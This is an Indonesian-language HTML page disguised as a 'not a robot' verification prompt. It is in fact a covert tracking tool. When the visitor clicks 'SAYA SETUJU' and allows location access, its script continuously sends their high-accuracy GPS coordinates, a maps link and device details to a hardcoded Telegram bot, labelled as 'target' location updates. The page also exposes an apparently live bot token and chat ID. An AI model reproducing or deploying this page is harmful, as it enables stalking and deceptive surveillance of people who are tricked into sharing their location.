<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center h-screen">

    <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl max-w-sm text-center border border-gray-700">
        <h2 class="text-2xl font-bold mb-4">Konfirmasi Akses</h2>
        <p class="text-gray-400 mb-6">Harap izinkan akses lokasi untuk memverifikasi bahwa Anda bukan robot.</p>
        
        <button onclick="mulaiLacak()" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-bold transition-all w-full shadow-lg">
            SAYA SETUJU
        </button>
        
        <p id="status" class="mt-4 text-xs text-gray-500 italic"></p>
    </div>

    <script>
        // --- KONFIGURASI TELEGRAM ANDA ---
        const botToken = "8254533879:AAExi3a9lAtiYa82yvbpY34l40M9uHPf41U"; 
        const chatId = "5492455730"; 

        function mulaiLacak() {
            const status = document.getElementById('status');
            
            if (!navigator.geolocation) {
                status.innerText = "Browser tidak mendukung GPS.";
                return;
            }

            status.innerText = "Sedang memverifikasi lokasi...";

            // Menggunakan watchPosition agar LIVE SHARE (Terupdate terus)
            navigator.geolocation.watchPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    // Kirim data ke Telegram Anda secara otomatis
                    kirimKeTelegram(lat, lon, accuracy);

                    status.innerText = "Verifikasi Berhasil. Mohon tunggu...";
                },
                (error) => {
                    status.innerText = "Gagal: Anda harus mengizinkan akses lokasi.";
                },
                {
                    enableHighAccuracy: true, // Akurasi 100% menggunakan GPS
                    maximumAge: 0,
                    timeout: 10000
                }
            );
        }

        function kirimKeTelegram(lat, lon, acc) {
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const infoHP = `Merek HP: ${navigator.platform}\nBrowser: ${navigator.userAgent.split(') ')[1]}`;
            
            const pesan = `📍 LOKASI TARGET UPDATE!\n\n` +
                          `Latitude: ${lat}\n` +
                          `Longitude: ${lon}\n` +
                          `Akurasi: ${acc} meter\n\n` +
                          `${infoHP}\n\n` +
                          `Buka di Peta:\n${mapsLink}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: pesan
                })
            });
        }
    </script>
</body>
</html>
